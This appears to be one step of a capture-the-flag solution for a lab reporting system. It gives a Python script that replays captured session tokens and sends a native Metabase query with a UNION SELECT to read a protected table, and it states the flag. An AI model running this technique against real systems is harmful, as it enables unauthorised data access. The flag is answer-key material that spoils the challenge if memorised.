Requires W09.4 (process_session) and W11.1. The old Bolt facade endpoint `/api/relation-exchanges` is retired (410). Use the `planning.relation-exchange` route from the planning client document. The route points to a native Metabase card. Read the card metadata to get its `database_id`, then run a native `/api/dataset` query.

`relation_responses` holds the protected row `REL-ASC-CRR-4417-R3`. The planner session reads it through native SQL. Its columns are `name, revision, relation, asset, work_order, flag`. Select the `flag` column to recover the flag.

```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
planner = pathlib.Path("receipts/planner-session").read_text().strip()
mb_h = {"X-Metabase-Session": planner, "Content-Type": "application/json"}

doc = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://planning-data.arwc.test/.well-known/arwc-client",
                           headers={"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc"}),
    context=ctx).read())
card_path = next(r["template"] for r in doc["routes"] if r["key"] == "planning.relation-exchange").split("reports.arwc.test")[1]
card = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://reports.arwc.test" + card_path, headers=mb_h), context=ctx).read())
database_id = card["database_id"]

# The card SQL inserts the template variable as a double-quoted identifier:
#   SELECT ... FROM "<relation_type>" WHERE asset = 'AST-CRR-017'
# A native /api/dataset query reaches relation_responses directly with the UNION.
sql = ('SELECT name, revision, relation, asset, flag FROM "work_order_summary" WHERE 1=0 '
       'UNION SELECT name, revision, relation, asset, flag FROM relation_responses')
result = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://reports.arwc.test/api/dataset",
        data=json.dumps({"database": database_id, "type": "native",
                         "native": {"query": sql, "template-tags": {}}}).encode(),
        headers=mb_h, method="POST"), context=ctx, timeout=30).read())
cols = [c["name"] for c in result["data"]["cols"]]
row = next(dict(zip(cols, r)) for r in result["data"]["rows"]
           if dict(zip(cols, r))["name"] == "REL-ASC-CRR-4417-R3")
print("relation:", row["relation"], "asset:", row["asset"])
print("flag:", row["flag"])   # FLAG{6c7d3f3e1de42300}
```

Flag: `FLAG{6c7d3f3e1de42300}` in the `flag` column of the `REL-ASC-CRR-4417-R3` row.
